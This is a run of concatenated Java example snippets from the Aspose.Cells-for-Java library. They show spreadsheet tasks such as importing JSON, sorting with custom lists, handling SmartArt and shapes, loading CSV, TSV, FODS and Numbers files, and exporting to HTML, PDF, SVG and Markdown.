// Set JsonLayoutOptions
JsonLayoutOptions options = new JsonLayoutOptions();
options.setTitleStyle(style);
options.setArrayAsTable(true);


// Import JSON Data
JsonUtility.importData(jsonInput, worksheet.getCells(), 0, 0, options);


// Save Excel file
workbook.save(dataDir + ""ImportingFromJson.out.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the output directory.
String outputDir = Utils.Get_OutputDirectory();


// Instantiating a Workbook object
Workbook workbook = new Workbook();


// Adding a new worksheet to the Excel object
int i = workbook.getWorksheets().add();


// Obtaining the reference of the newly added worksheet by passing its sheet index
Worksheet worksheet = workbook.getWorksheets().get(i);


// Accessing the ""A1"" cell from the worksheet
Cell cell = worksheet.getCells().get(""A1"");


// Adding some value to the ""A1"" cell
cell.putValue(""Hello Aspose!"");


// Obtaining the style of the cell
Style style = cell.getStyle();
// Setting the font weight to bold
style.getFont().setBold(true);
// Applying the style to the cell
cell.setStyle(style);


// Saving the Excel file
workbook.save(outputDir + ""book1.out.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


public class ShiftFirstRowDownWhenInsertingCellsDataTableRows {
 
 class CellsDataTable implements ICellsDataTable
	{
 //This is the current row index
 int m_index=-1;
 
 //These are your column names
 String[] colsNames = new String[] { ""Pet"", ""Fruit"", ""Country"", ""Color"" };
 
 //These are the data of each column
 String[] col0data = new String[] { ""Dog"", ""Cat"", ""Duck"" };
 String[] col1data = new String[] { ""Apple"", ""Pear"", ""Banana"" };
 String[] col2data = new String[] { ""UK"", ""USA"", ""China"" };
 String[] col3data = new String[] { ""Red"", ""Green"", ""Blue"" };
 
 //Combine all of the data into a single two dimensional array
 String[][] colsData = new String[][]{ col0data, col1data, col2data, col3data};
 
 
 public void beforeFirst() {
 m_index = -1;
	    }
 
 public Object get(int columnIndex) {
 
 Object o = null;
 o = colsData[columnIndex][m_index];
 return o;
	    }
 
 public Object get(String columnName) {
 return null;
	    }
 
 public String[] getColumns() {
 return colsNames;
	    }
 
 public int getCount() {
 return col0data.length;
	    }
 
 public boolean next() {
 m_index++;
 return true;
	    }
 
	}//End Class - CellsDataTable
 
 public void Run() throws Exception
	{
 String srcDir = Utils.Get_SourceDirectory();
 String outDir = Utils.Get_OutputDirectory();


 //Create the instance of Cells Data Table
 CellsDataTable cellsDataTable = new CellsDataTable();
 
 //Load the sample workbook
 Workbook wb = new Workbook(srcDir + ""sampleImportTableOptionsShiftFirstRowDown.xlsx"");
 
 //Access first worksheet
 Worksheet ws = wb.getWorksheets().get(0);
 
 //Import data table options
 ImportTableOptions opts = new ImportTableOptions();
 
 //We do now want to shift the first row down when inserting rows. 
 opts.setShiftFirstRowDown(false);
 
 //Import cells data table 
 ws.getCells().importData(cellsDataTable, 2, 2, opts);
 
 //Save the workbook
 wb.save(outDir + ""outputImportTableOptionsShiftFirstRowDown-False.xlsx"");
	}
 
 public static void main(String[] args) throws Exception {
 
 ShiftFirstRowDownWhenInsertingCellsDataTableRows pg = new ShiftFirstRowDownWhenInsertingCellsDataTableRows();
 pg.Run();	
	}
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the source Excel file
Workbook wb = new Workbook(srcDir + ""sampleSortData_CustomSortList.xlsx"");
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Specify cell area - sort from A1 to A40
CellArea ca = CellArea.createCellArea(""A1"", ""A40"");
 
//Create Custom Sort list
String[] customSortList = new String[] { ""USA,US"", ""Brazil,BR"", ""China,CN"", ""Russia,RU"", ""Canada,CA"" };
 
//Add Key for Column A, Sort it in Ascending Order with Custom Sort List
wb.getDataSorter().addKey(0, SortOrder.ASCENDING, customSortList);
wb.getDataSorter().sort(ws.getCells(), ca);
 
//Save the output Excel file
wb.save(outDir + ""outputSortData_CustomSortList.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load the sample smart art shape - Excel file
Workbook wb = new Workbook(""sampleSmartArtShape_GetResultOfSmartArt.xlsx"");


//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);


//Access first shape
Shape sh = ws.getShapes().get(0);


//Determine if shape is smart art
System.out.println(""Is Smart Art Shape: "" + sh.isSmartArt());


//Determine if shape is group shape
System.out.println(""Is Group Shape: "" + sh.isGroup());


//Convert smart art shape into group shape
System.out.println(""Is Group Shape: "" + sh.getResultOfSmartArt().isGroup());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
 
//Load the sample smart art shape - Excel file
Workbook wb = new Workbook(""sampleSmartArtShape.xlsx"");
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Access first shape
Shape sh = ws.getShapes().get(0);
 
//Determine if shape is smart art
System.out.println(""Is Smart Art Shape: "" + sh.isSmartArt());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the resource directory
String dataDir = Utils.getSharedDataDir(NonPrimitiveShape.class) + ""DrawingObjects/"";


Workbook workbook = new Workbook(dataDir + ""NonPrimitiveShape.xlsx"");


Worksheet worksheet = workbook.getWorksheets().get(0);


// Accessing the user defined shape
Shape shape = worksheet.getShapes().get(0);


if (shape.getAutoShapeType() == AutoShapeType.NOT_PRIMITIVE) {


 // Access Shape paths
 ShapePathCollection shapePathCollection = shape.getPaths();


 // Access information of individual shape path
 ShapePath shapePath = shapePathCollection.get(0);


 // Access shape segment path list
 ShapeSegmentPathCollection shapeSegmentPathCollection = shapePath.getPathSegementList();


 // Access individual segment path
 ShapeSegmentPath shapeSegmentPath = shapeSegmentPathCollection.get(0);
 
 ShapePathPointCollection segmentPoints = shapeSegmentPath.getPoints();
 
 for (Object obj : segmentPoints) {
 ShapePathPoint pathPoint = (ShapePathPoint) obj;
 System.out.println(""X: "" + pathPoint.getX() + "", Y: "" + pathPoint.getY());
          }
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
public static void main(String[] args) throws Exception {
 Workbook wb = new Workbook(srcDir + ""sampleReplaceTagWithText.xlsx"");
 String tag = ""TAG_2#TAG_1"";
 String replace = ""1#ys"";
 for (int i = 0; i < tag.split(""#"").length; i++) {
 sheetReplace(wb, ""<"" + tag.split(""#"")[i] + "">"", replace.split(""#"")[i]);
       }
 PdfSaveOptions opts = new PdfSaveOptions();


 wb.save(outDir + ""outputReplaceTagWithText.pdf"", opts);
 
 // Print the message
 System.out.println(""ReplaceTagWithTextInTextBox executed successfully."");


}
 public static void sheetReplace(Workbook workbook, String sFind, String sReplace) throws Exception
   {
 String finding = sFind;


 for (Object obj : workbook.getWorksheets()) {
 Worksheet sheet = (Worksheet)obj;
 sheet.replace(finding, sReplace);


 for (int j = 0; j < 3; j++) {
 if (sheet.getPageSetup().getHeader(j) != null) {
 sheet.getPageSetup().setHeader(j, sheet.getPageSetup().getHeader(j).replace(finding, sReplace));
               }
 if (sheet.getPageSetup().getFooter(j) != null) {
 sheet.getPageSetup().setFooter(j, sheet.getPageSetup().getFooter(j).replace(finding, sReplace));
               }
           }
       }


 for (Object obj: workbook.getWorksheets()) {
 Worksheet sheet = (Worksheet)obj;	
 sFind = sFind.replace(""<"", ""&lt;"");
 sFind = sFind.replace("">"", ""&gt;"");


 for (Object obj1 : sheet.getTextBoxes()) {
 TextBox mytextbox = (TextBox)obj1;


 if (mytextbox.getHtmlText() != null) {
 if (mytextbox.getHtmlText().indexOf(sFind) >= 0) {
 mytextbox.setHtmlText(mytextbox.getHtmlText().replace(sFind, sReplace));
                   }
               }
           }
       }
   }
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
Workbook wb = new Workbook(srcDir + ""SmartArt.xlsx"");
for (Object obj : wb.getWorksheets())
{
 Worksheet worksheet = (Worksheet)obj;
 for (Object shp : worksheet.getShapes())
    {
 Shape shape = (Shape)shp;
 shape.setAlternativeText(""ReplacedAlternativeText""); // This works fine just as the normal Shape objects do.
 if (shape.isSmartArt())
        {
 for (Shape smartart : shape.getResultOfSmartArt().getGroupedShapes())
            {
 smartart.setText(""ReplacedText""); // This doesn't update the text in Workbook which I save to the another file.
            }
        }
    }
}
com.aspose.cells.OoxmlSaveOptions options = new com.aspose.cells.OoxmlSaveOptions();
options.setUpdateSmartArt(true);
 
wb.save(outDir + ""outputSmartArt.xlsx"", options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load source Excel file
Workbook wb = new Workbook(srcDir + ""sampleToFrontOrBack.xlsx"");
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Access first and fourth shape
Shape sh1 = ws.getShapes().get(0);
Shape sh4 = ws.getShapes().get(3);
 
//Print the Z-Order position of the shape
System.out.println(""Z-Order Shape 1: "" + sh1.getZOrderPosition());
 
//Send this shape to front
sh1.toFrontOrBack(2);
 
//Print the Z-Order position of the shape
System.out.println(""Z-Order Shape 4: "" + sh4.getZOrderPosition());
 
//Send this shape to back
sh4.toFrontOrBack(-2);
 
//Save the output Excel file
wb.save(outDir + ""outputToFrontOrBack.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Load sample Excel file
Workbook wb = new Workbook(srcDir + ""sampleTextureFill_IsTiling.xlsx"");
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Access first shape inside the worksheet
Shape sh = ws.getShapes().get(0);
 
//Tile Picture as a Texture inside the Shape 
sh.getFill().getTextureFill().setTiling(true);
 
//Save the output Excel file
wb.save(outDir + ""outputTextureFill_IsTiling.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the source directory.
String sourceDir = Utils.Get_SourceDirectory();


// Instantiate LoadOptions specified by the LoadFormat.
LoadOptions loadOptions = new LoadOptions(LoadFormat.FODS);


// Create a Workbook object and opening the file from its path
Workbook workbook = new Workbook(sourceDir + ""SampleFods.fods"", loadOptions);


// Print message
System.out.println(""FODS file opened successfully!"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the source directory.
String sourceDir = Utils.Get_SourceDirectory();


// Instantiate LoadOptions specified by the LoadFormat.
LoadOptions loadOptions = new LoadOptions(LoadFormat.SXC);


// Create a Workbook object and opening the file from its path
Workbook workbook = new Workbook(sourceDir + ""SampleSXC.sxc"", loadOptions);
 
// Using the Sheet 1 in Workbook
Worksheet worksheet = workbook.getWorksheets().get(0);


// Accessing a cell using its name
Cell cell = worksheet.getCells().get(""C3"");


System.out.println(""Cell Name: "" + cell.getName() + "" Value: "" + cell.getStringValue());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the source directory.
String sourceDir = Utils.Get_SourceDirectory();


// Instantiate LoadOptions specified by the LoadFormat.
LoadOptions loadOptions = new LoadOptions(LoadFormat.TSV);


// Create a Workbook object and opening the file from its path
Workbook workbook = new Workbook(sourceDir + ""SampleTSVFile.tsv"", loadOptions);
 
// Using the Sheet 1 in Workbook
Worksheet worksheet = workbook.getWorksheets().get(0);


// Accessing a cell using its name
Cell cell = worksheet.getCells().get(""C3"");


System.out.println(""Cell Name: "" + cell.getName() + "" Value: "" + cell.getStringValue());
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String srcDir = Utils.Get_SourceDirectory();
String outDir = Utils.Get_OutputDirectory();


// Open an Excel file.
Workbook workbook = new Workbook(
 srcDir + ""sampleSetDefaultFontPropertyOfPdfSaveOptionsAndImageOrPrintOptions.xlsx"");


// Rendering to PNG file format while setting the
// CheckWorkbookDefaultFont attribute to false.
// So, ""Times New Roman"" font would be used for any missing (not
// installed) font in the workbook.
ImageOrPrintOptions imgOpt = new ImageOrPrintOptions();
imgOpt.setImageType(ImageType.PNG);
imgOpt.setCheckWorkbookDefaultFont(false);
imgOpt.setDefaultFont(""Times New Roman"");
SheetRender sr = new SheetRender(workbook.getWorksheets().get(0), imgOpt);
sr.toImage(0, outDir + ""outputSetDefaultFontProperty_ImagePNG.png"");


// Rendering to TIFF file format while setting the
// CheckWorkbookDefaultFont attribute to false.
// So, ""Times New Roman"" font would be used for any missing (not
// installed) font in the workbook.
imgOpt.setImageType(ImageType.TIFF);
WorkbookRender wr = new WorkbookRender(workbook, imgOpt);
wr.toImage(outDir + ""outputSetDefaultFontProperty_ImageTIFF.tiff"");


// Rendering to PDF file format while setting the
// CheckWorkbookDefaultFont attribute to false.
// So, ""Times New Roman"" font would be used for any missing (not
// installed) font in the workbook.
PdfSaveOptions saveOptions = new PdfSaveOptions();
saveOptions.setDefaultFont(""Times New Roman"");
saveOptions.setCheckWorkbookDefaultFont(false);
workbook.save(outDir + ""outputSetDefaultFontProperty_PDF.pdf"", saveOptions);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
 
//Implement calculation monitor class
class clsCalculationMonitor extends AbstractCalculationMonitor
{
 public void beforeCalculate(int sheetIndex, int rowIndex, int colIndex)
    {
 //Find the cell name
 String cellName = CellsHelper.cellIndexToName(rowIndex, colIndex);


 //Print the sheet, row and column index as well as cell name
 System.out.println(sheetIndex + ""----"" + rowIndex + ""----"" + colIndex + ""----"" + cellName);


 //If cell name is B8, interrupt/cancel the formula calculation
 if (cellName.equals(""B8"") == true)
	{
 this.interrupt(""Interrupt/Cancel the formula calculation"");
	}//if


    }//beforeCalculate


}//clsCalculationMonitor


//---------------------------------------------------------     
//---------------------------------------------------------


public void Run() throws Exception
{   
 //Load the sample Excel file
 Workbook wb = new Workbook(srcDir + ""sampleCalculationMonitor.xlsx"");


 //Create calculation options and assign instance of calculation monitor class
 CalculationOptions opts = new CalculationOptions();
 opts.setCalculationMonitor(new clsCalculationMonitor());


 //Calculate formula with calculation options
 wb.calculateFormula(opts);
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create empty workbook
Workbook workbook = new Workbook();


// Register macro enabled add-in along with the function name
int id = workbook.getWorksheets().registerAddInFunction(srcDir + ""TESTUDF.xlam"", ""TEST_UDF"", false);


// Register more functions in the file (if any)
workbook.getWorksheets().registerAddInFunction(id, ""TEST_UDF1""); //in this way you can add more functions that are in the same file


// Access first worksheet
Worksheet worksheet = workbook.getWorksheets().get(0);


// Access first cell
Cell cell = worksheet.getCells().get(""A1"");


// Set formula name present in the add-in
cell.setFormula(""=TEST_UDF()"");


// Save workbook to output XLSX format.
workbook.save(outDir +  ""test_udf.xlsx"", SaveFormat.XLSX);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Create workbook
Workbook workbook = new Workbook();


// Add worksheet
workbook.getWorksheets().add(""HelloWorldPage"");
 
// Set cell value
workbook.getWorksheets().get(""HelloWorldPage"").getCells().get(0, 0).setValue(""HelloWorldCell"");


// Save workbook
workbook.save(""HelloWorld.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
public class DataObject
{
 private int id;
 private String name;


 public DataObject(int id, String name)
    {
 this.id = id;
 this.name = name;
    }


 public int getId()
    {
 return this.id;
    }


 public void setId(int value)
    {
 this.id = value;
    }


 public String getName()
    {
 return this.name;
    }


 public void setName(String value)
    {
 this.name = value;
    }
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Load the Excel file.
Workbook wb = new Workbook(srcDir + ""sampleInlineCharts.xlsx"");


// Access the sheet
Worksheet ws = wb.getWorksheets().get(0);


// Set the print area.
ws.getPageSetup().setPrintArea(""D2:M20"");


// Initialize HtmlSaveOptions
HtmlSaveOptions options = new HtmlSaveOptions();


// Set flag to export print area only
options.setExportPrintAreaOnly(true);


//Save to HTML format
wb.save(outDir + ""outputInlineCharts.html"",options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Load the Excel file.
Workbook workbook = new Workbook(sourceDir + ""Book1.xlsx"");


// Initialize HtmlSaveOptions
HtmlSaveOptions options = new HtmlSaveOptions();
options.setExportHeadings(true);


//Save to HTML format
workbook.save(outputDir + ""PrintHeadings_out.html"", options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Set Html load options and keep precision true
HtmlLoadOptions loadOptions = new HtmlLoadOptions(LoadFormat.HTML);


// Load sample source file
Workbook wb = new Workbook(srcDir + ""sampleSelfClosingTags.html"", loadOptions);


// Save the workbook
wb.save(outDir + ""outsampleSelfClosingTags.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Load the sample Excel file containing single sheet only
Workbook wb = new Workbook(srcDir + ""sampleSingleSheet.xlsx"");


// Specify HTML save options
HtmlSaveOptions options = new HtmlSaveOptions();


// Set optional settings if required
options.setEncoding(Encoding.getUTF8());
options.setExportImagesAsBase64(true);
options.setExportGridLines(true);
options.setExportSimilarBorderStyle(true);
options.setExportBogusRowData(true);
options.setExcludeUnusedStyles(true);
options.setExportHiddenWorksheet(true);


//Save the workbook in Html format with specified Html Save Options
wb.save(outDir + ""outputSampleSingleSheet.htm"", options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(AutoFitColumnsRowsLoadingHTML.class) + ""LoadingSavingConvertingAndManaging/"";
 
//Sample HTML.
String sampleHtml = ""<html><body><table><tr><td>This is sample text.</td><td>Some text.</td></tr><tr><td>This is another sample text.</td><td>Some text.</td></tr></table></body></html>"";
//Load html string into byte array input stream
ByteArrayInputStream bais = new ByteArrayInputStream(sampleHtml.getBytes());
 
//Load byte array stream into workbook.
Workbook wb = new Workbook(bais);
 
//Save the workbook in xlsx format.
wb.save(dataDir + ""outputWithout_AutoFitColsAndRows.xlsx"");
 
//Specify the HtmlLoadOptions and set AutoFitColsAndRows = true.
HtmlLoadOptions opts = new HtmlLoadOptions();
opts.setAutoFitColsAndRows(true);
 
//Load byte array stream into workbook with the above HtmlLoadOptions.
bais.reset();
wb = new Workbook(bais, opts);
 
//Save the workbook in xlsx format.
wb.save(dataDir + ""outputWith_AutoFitColsAndRows.xlsx"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
String outputDir = Utils.Get_OutputDirectory();


// Instantiate a workbook
Workbook workbook = new Workbook();


// Put sample text in the first cell of first worksheet in the newly created workbook
workbook.getWorksheets().get(0).getCells().get(""A1"").setValue(""DEMO TEXT ON SHEET1"");


// Add second worksheet in the workbook
workbook.getWorksheets().add(SheetType.WORKSHEET);


// Set text in first cell of the second sheet
workbook.getWorksheets().get(1).getCells().get(""A1"").setValue(""DEMO TEXT ON SHEET2"");


// Set currently active sheet index to 1 i.e. Sheet2
workbook.getWorksheets().setActiveSheetIndex(1);


// Save workbook to SVG. It shall render the active sheet only to SVG
workbook.save(outputDir + ""ConvertActiveWorksheetToSVG_out.svg"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Source directory
String sourceDir = Utils.Get_SourceDirectory();


LoadOptions loadOptions = new LoadOptions(LoadFormat.CSV);
// Load CSV file
Workbook workbook = new Workbook(sourceDir + ""SampleCsv.csv"", loadOptions);
Cell lastCell = workbook.getWorksheets().get(0).getCells().getLastCell();


// Set ExportRangeToJsonOptions
ExportRangeToJsonOptions options = new ExportRangeToJsonOptions();
Range range = workbook.getWorksheets().get(0).getCells().createRange(0, 0, lastCell.getRow() + 1, lastCell.getColumn() + 1);
String data = JsonUtility.exportRangeToJson(range, options);


// Print JSON
System.out.println(data);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//directories
String sourceDir = Utils.Get_SourceDirectory();
String outputDir = Utils.Get_OutputDirectory();


// Open the template file
Workbook workbook = new Workbook(sourceDir + ""AddTooltipToHtmlSample.xlsx"");


HtmlSaveOptions options = new HtmlSaveOptions();
options.setAddTooltipText(true);


// Save as Markdown
workbook.save(outputDir + ""AddTooltipToHtmlSample_out.html"", options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ConvertExcelFileToMarkdown.class) + ""LoadingSavingConvertingAndManaging/"";


Workbook workbook = new Workbook(dataDir + ""Book1.xls"");


// Save as Markdown
workbook.save(dataDir + ""Book1.md"", SaveFormat.MARKDOWN);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Create workbook object
Workbook wb = new Workbook();
 
//Access first worksheet
Worksheet ws = wb.getWorksheets().get(0);
 
//Access cell B5 and add some message inside it
Cell cell = ws.getCells().get(""B5"");
cell.putValue(""This PDF format is compatible with PDFA-1a."");
 
//Create pdf save options and set its compliance to PDFA-1a
PdfSaveOptions opts = new PdfSaveOptions();
opts.setCompliance(PdfCompliance.PDF_A_1_A);
 
//Save the output pdf
wb.save(dataDir + ""outputCompliancePdfA1a.pdf"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Source directory
String sourceDir = Utils.Get_SourceDirectory();


//Output directory
String outputDir = Utils.Get_OutputDirectory();


// Read JSON file
String str = new String(Files.readAllBytes(Paths.get(sourceDir + ""SampleJson.json"")));


// Create empty workbook
Workbook workbook = new Workbook();


// Get Cells
Cells cells = workbook.getWorksheets().get(0).getCells();


// Set JsonLayoutOptions
JsonLayoutOptions importOptions = new JsonLayoutOptions();
importOptions.setConvertNumericOrDate(true);
importOptions.setArrayAsTable(true);
importOptions.setIgnoreArrayTitle(true);
importOptions.setIgnoreObjectTitle(true);
JsonUtility.importData(str, cells, 0, 0, importOptions);


// Save Workbook
workbook.save(outputDir + ""SampleJson_out.csv"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Load sample workbook
Workbook wb = new Workbook(srcDir + ""sampleDisableDownlevelRevealedComments.xlsx"");
 
// Disable DisableDownlevelRevealedComments
HtmlSaveOptions opts = new HtmlSaveOptions();
opts.setDisableDownlevelRevealedComments(true);
 
// Save the workbook in html
wb.save(outDir + ""outputDisableDownlevelRevealedComments_true.html"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the source directory.
String sourceDir = Utils.Get_SourceDirectory();


// The path to the output directory.
String outputDir = Utils.Get_OutputDirectory();


Workbook wb = new Workbook(sourceDir + ""PagesBook1.xlsx"");


PdfSaveOptions pdfSaveOptions = new PdfSaveOptions();
pdfSaveOptions.setPageSavingCallback(new TestPageSavingCallback());


wb.save(outputDir + ""DocumentConversionProgress.pdf"", pdfSaveOptions);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
class TestPageSavingCallback implements IPageSavingCallback {
 public void pageStartSaving(PageStartSavingArgs args)
    {
 System.out.println(""Start saving page index "" + args.getPageIndex() + "" of pages "" + args.getPageCount());


 //don't output pages before page index 2.
 if (args.getPageIndex() < 2)
        {
 args.setToOutput(false);
        }
    }


 public void pageEndSaving(PageEndSavingArgs args)
    {
 System.out.println(""End saving page index "" + args.getPageIndex() + "" of pages "" + args.getPageCount());


 //don't output pages after page index 8.
 if (args.getPageIndex() >= 8)
        {
 args.setHasMorePages(false);
        }
    }
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the source directory.
String sourceDir = Utils.Get_SourceDirectory();


// The path to the output directory.
String outputDir = Utils.Get_OutputDirectory();


Workbook wb = new Workbook(sourceDir + ""sampleUseWorkbookRenderForImageConversion.xlsx"");


 ImageOrPrintOptions opts = new ImageOrPrintOptions();
 opts.setPageSavingCallback(new TestTiffPageSavingCallback());
 opts.setImageType(ImageType.TIFF);


 WorkbookRender wr = new WorkbookRender(wb, opts);
 wr.toImage(outputDir + ""DocumentConversionProgressForTiff_out.tiff"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
class TestTiffPageSavingCallback implements IPageSavingCallback {
 public void pageStartSaving(PageStartSavingArgs args)
    {
 System.out.println(""Start saving page index "" + args.getPageIndex() + "" of pages "" + args.getPageCount());


 //don't output pages before page index 2.
 if (args.getPageIndex() < 2)
        {
 args.setToOutput(false);
        }
    }


 public void pageEndSaving(PageEndSavingArgs args)
    {
 System.out.println(""End saving page index "" + args.getPageIndex() + "" of pages "" + args.getPageCount());


 //don't output pages after page index 8.
 if (args.getPageIndex() >= 8)
        {
 args.setHasMorePages(false);
        }
    }
}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Load sample Excel file
Workbook wb = new Workbook(srcDir + ""sampleExportCommentsHTML.xlsx"");
 
// Export comments - set IsExportComments property to true
HtmlSaveOptions opts = new HtmlSaveOptions();
opts.setExportComments(true);
 
// Save the Excel file to HTML
wb.save(outDir + ""outputExportCommentsHTML.html"", opts);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// The path to the documents directory.
String dataDir = Utils.getSharedDataDir(ConvertTableToRangeWithOptions.class) + ""LoadingSavingConvertingAndManaging/"";
// Open an existing file that contains a table/list object in it
Workbook workbook = new Workbook(dataDir + ""KeepSeparatorsForBlankRow.xlsx"");


// Instantiate Text File's Save Options
TxtSaveOptions options = new TxtSaveOptions();
 
// Set KeepSeparatorsForBlankRow to true show separators in blank rows
options.setKeepSeparatorsForBlankRow(true);
 
// Save the file with the options
workbook.save(dataDir + ""KeepSeparatorsForBlankRow.out.csv"", options);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
//Source directory
String dataDir = Utils.getSharedDataDir(OpeningCSVFilesAndReplacingInvalidCharacters.class) + ""LoadingSavingConvertingAndManaging/"";
 
LoadOptions loadOptions = new LoadOptions(LoadFormat.CSV);


//Load CSV file
Workbook workbook = new Workbook(dataDir + ""[20180220142533][ASPOSE_CELLS_TEST].csv"", loadOptions);


System.out.println(workbook.getWorksheets().get(0).getName()); // (20180220142533)(ASPOSE_CELLS_T
System.out.println(workbook.getWorksheets().get(0).getName().length()); // 31
System.out.println(""CSV file opened successfully!"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
class TextParser implements ICustomParser
{
 @Override
 public Object parseObject(String s) {
 return s;
	}


 @Override
 public String getFormat() {
 return """";
	}
}


class DateParser implements ICustomParser {
 @Override
 public Object parseObject(String s) {
 Date myDate = null;
 SimpleDateFormat formatter = new SimpleDateFormat(""dd/MM/yyyy"");
 try {
 myDate = formatter.parse(s);
		} catch (ParseException e) {
 e.printStackTrace();
		}
 return myDate;
	}


 @Override
 public String getFormat() {
 return ""dd/MM/yyyy"";
	}
}


public class OpeningCSVFilesWithPreferredParser {


 //Source directory
 private static String sourceDir = Utils.Get_SourceDirectory();
 private static String outputDir = Utils.Get_OutputDirectory();


 public static void main(String[] args) throws Exception {


 // Initialize Text File's Load options
 TxtLoadOptions oTxtLoadOptions = new TxtLoadOptions(LoadFormat.CSV);


 // Specify the separatot character
 oTxtLoadOptions.setSeparator(',');


 // Specify the encoding scheme
 oTxtLoadOptions.setEncoding(Encoding.getUTF8());


 // Set the flag to true for converting datetime data
 oTxtLoadOptions.setConvertDateTimeData(true);


 // Set the preferred parsers
 oTxtLoadOptions.setPreferredParsers(new ICustomParser[] { new TextParser(), new DateParser() });


 // Initialize the workbook object by passing CSV file and text load options
 Workbook oExcelWorkBook = new Workbook(sourceDir + ""samplePreferredParser.csv"", oTxtLoadOptions);


 // Get the first cell
 Cell oCell = oExcelWorkBook.getWorksheets().get(0).getCells().get(""A1"");


 // Display type of value
 System.out.println(""A1: "" + getCellType(oCell.getType()) + "" - "" + oCell.getDisplayStringValue());


 // Get the second cell
 oCell = oExcelWorkBook.getWorksheets().get(0).getCells().get(""B1"");


 // Display type of value
 System.out.println(""B1: "" + getCellType(oCell.getType()) + "" - "" + oCell.getDisplayStringValue());


 // Save the workbook to disc
 oExcelWorkBook.save(outputDir + ""outputsamplePreferredParser.xlsx"");


 System.out.println(""OpeningCSVFilesWithPreferredParser executed successfully.\r\n"");
	}


 private static String getCellType(int type){
 if(type == CellValueType.IS_STRING){
 return ""String"";
		} else if(type == CellValueType.IS_NUMERIC){
 return ""Numeric"";
		} else if(type == CellValueType.IS_BOOL){
 return ""Bool"";
		} else if(type == CellValueType.IS_DATE_TIME){
 return ""Date"";
		} else if(type == CellValueType.IS_NULL){
 return ""Null"";
		} else if(type == CellValueType.IS_ERROR){
 return ""Error"";
		} else{
 return ""Unknown"";
		}
	}
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java
// Opening Microsoft Excel 97 Files
// Creating an EXCEL_97_TO_2003 LoadOptions object


// Creating an Workbook object with excel 97 file path and the
// loadOptions object
new Workbook(srcDir + ""Excel95_5.0.xls"");
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


// Specify load options, we want to load Numbers spreadsheet.
LoadOptions opts = new LoadOptions(LoadFormat.NUMBERS);


// Load the Numbers spreadsheet in workbook with above load options.
Workbook wb = new Workbook(srcDir + ""sampleNumbersByAppleInc.numbers"", opts);


// Save the workbook to pdf format
wb.save(outDir + ""outputNumbersByAppleInc.pdf"", SaveFormat.PDF);
// For complete examples and data files, please go to https://github.com/aspose-cells/Aspose.Cells-for-Java


//Enum to String
String[] strsHtmlCrossStringType = new String[]{""Default"", ""MSExport"", ""Cross"", ""FitToCell""};
 
//Load the sample Excel file
Workbook wb = new Workbook(""sampleHtmlCrossStringType.xlsx"");
 
//Specify HTML Cross Type
HtmlSaveOptions opts = new HtmlSaveOptions();
opts.setHtmlCrossStringType(HtmlCrossType.DEFAULT);
opts.setHtmlCrossStringType(HtmlCrossType.MS_EXPORT);
